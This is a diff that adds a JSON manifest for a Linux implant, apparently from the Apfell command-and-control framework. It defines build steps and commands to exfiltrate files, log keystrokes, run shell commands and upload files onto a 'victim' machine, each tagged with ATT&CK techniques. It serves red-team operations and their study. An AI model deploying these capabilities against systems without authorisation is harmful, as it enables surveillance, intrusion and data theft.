@@ -1,0 +1,194 @@
+{
+  "payload_types":
+  [
+    {
+      "wrapper":false,
+      "command_template":"int command_name(cJSON* json){\n    \/\/parse out the generic params like: char* path = cJSON_GetObjectItem(json, \"params\")->valuestring;\n    \/\/parse out JSON params like: cJSON* params = cJSON_Parse(cJSON_GetObjectItem(json, \"params\")->valuestring);\n    \/\/send a standard response back with: send_basic_response(\"message here\", cJSON_GetObjectItem(json, \"id\")->valueint);\n    \/\/last thing to do is call: cJSON_Delete(json);\n    \/\/and return an int value\n    }\n        COMMAND_ENDS_HERE\n        int command_name(cJSON*);\n        \/\/ can also include other headers if you need them\n        ",
+      "supported_os":"linux (x64)",
+      "execute_help":"outputs an x64 ELF",
+      "ptype":"linfell",
+      "file_extension":".c",
+      "wrapped_payload_type":"null",
+      "external": false,
+      "files":[],
+      "c2_profiles":{},
+      "load_transforms":[
+        {
+          "parameter":"compiled.o",
+          "name":"readFileToBytearray",
+          "order":5
+        },
+        {
+          "parameter":"gcc -std=c99 -fPIC -pthread -w default_commands.c -shared -o compiled.o -lssl -lcrypto -ldl -lrt",
+          "name":"compile",
+          "order":4
+        },
+        {
+          "parameter":"default_commands.h",
+          "name":"stampSavedHeaders",
+          "order":3
+        },
+        {
+          "parameter":"default_commands.c",
+          "name":"stampSavedCommands",
+          "order":2
+        },
+        {
+          "parameter":"",
+          "name":"saveCommandsAndHeaders",
+          "order":1
+        }
+      ],
+      "create_transforms":[
+        {
+          "parameter":"compiled.o",
+          "name":"readFileToBytearray",
+          "order":2},
+        {
+          "parameter":"gcc -std=c99 -fPIC -rdynamic -pthread -w *.c -o compiled.o -lssl -lcrypto -ldl -lrt",
+          "name":"compile",
+          "order":1}
+      ],
+      "commands":[
+        {
+          "needs_admin":false,
+          "help_cmd":"download \/path\/to\/file",
+          "version":1,
+          "description":"Downloads a file from the victim machine to the Apfell server via the current C2",
+          "cmd":"download",
+          "parameters":[],
+          "attack":[
+            {
+              "t_num":"T1041",
+              "attack_name":"Exfiltration Over Command and Control Channel"},
+            {
+              "t_num":"T1030",
+              "attack_name":"Data Transfer Size Limits"}
+          ],
+          "artifacts": []
+        },
+        {
+          "needs_admin":false,
+          "help_cmd":"load cmd1, cmd2",
+          "version":1,
+          "description":"Creates and loads in a module",
+          "cmd":"load",
+          "parameters":[],
+          "attack":[],
+          "artifacts": []
+        },
+        {
+          "needs_admin": false,
+          "help_cmd": "screencapture",
+          "version": 1,
+          "description": "Calls the gnome-screenshot util (very non-opsec safe because it causes a screen flash) and saves the file out to /tmp, downloads it, then deletes the file. Purely for demo purposes",
+          "cmd": "screencapture",
+          "parameters": [],
+          "attack": [],
+          "artifacts": []
+        },
+        {
+          "needs_admin": false,
+          "help_cmd": "keylog",
+          "version": 1,
+          "description": "Uses a modified version of Empire's python xkeylogger to stream keylogs back to the Apfell server whenever the user switches between programs. This starts a log-running job that you will need to do jobs_kill to stop. You can see the results of the keylog in its own callback-specific tab or across the whole operation.",
+          "cmd": "keylog",
+          "parameters": [],
+          "attack": [],
+          "artifacts": []
+        },
+        {
+          "needs_admin":false,
+          "help_cmd":"shell {command}",
+          "version":1,
+          "description":"This runs {command} in a terminal by forking and running system({command}) and reading the output",
+          "cmd":"shell",
+          "parameters":[],
+          "attack":[
+            {
+              "t_num":"T1059",
+              "attack_name":"Command-Line Interface"}
+          ],
+          "artifacts": []
+        },
+        {
+          "needs_admin":false,
+          "help_cmd":"from UI: upload, from specific cmdline: upload {\"file_id\": 5, \"remote_path\":\"\/remote\/victim\/path\"}",
+          "version":1,
+          "description":"This uploads a file from the attacker's machine or the Apfell server to the target",
+          "cmd":"upload",
+          "parameters":[
+            {
+              "type":"Number",
+              "hint":"",
+              "choices":"",
+              "required":false,
+              "name":"file_id"
+            },
+            {
+              "type":"File",
+              "hint":"",
+              "choices":"",
+              "required":false,
+              "name":"file"
+            },
+            {
+              "type":"String",
+              "hint":"Target path for file",
+              "choices":"",
+              "required":true,
+              "name":"remote_path"
+            }
+          ],
+          "attack":[
+            {
+              "t_num":"T1105",
+              "attack_name":"Remote File Copy"
+            }
+          ],
+          "artifacts": []
+        },
+        {
+          "needs_admin":false,
+          "help_cmd":"quit",
+          "version":1,
+          "description":"Calls exit(0) to cleanly exit the agent",
+          "cmd":"quit",
+          "parameters":[
+
+          ],
+          "attack":[
+          ],
+          "artifacts": [],
+          "is_exit": true
+        },
+        {
+          "needs_admin":false,
+          "help_cmd":"jobs",
+          "version":1,
+          "description":"List current jobs that are running in the agent",
+          "cmd":"jobs",
+          "parameters":[
+
+          ],
+          "attack":[
+          ],
+          "artifacts": []
+        },
+        {
+          "needs_admin":false,
+          "help_cmd":"jobs_kill {task#}",
+          "version":1,
+          "description":"Calls pthread_cancel on a currently running task in a thread to end it.",
+          "cmd":"jobs_kill",
+          "parameters":[
+
+          ],
+          "attack":[
+          ],
+          "artifacts": []
+        }
+      ]
+    }
+  ]
+}
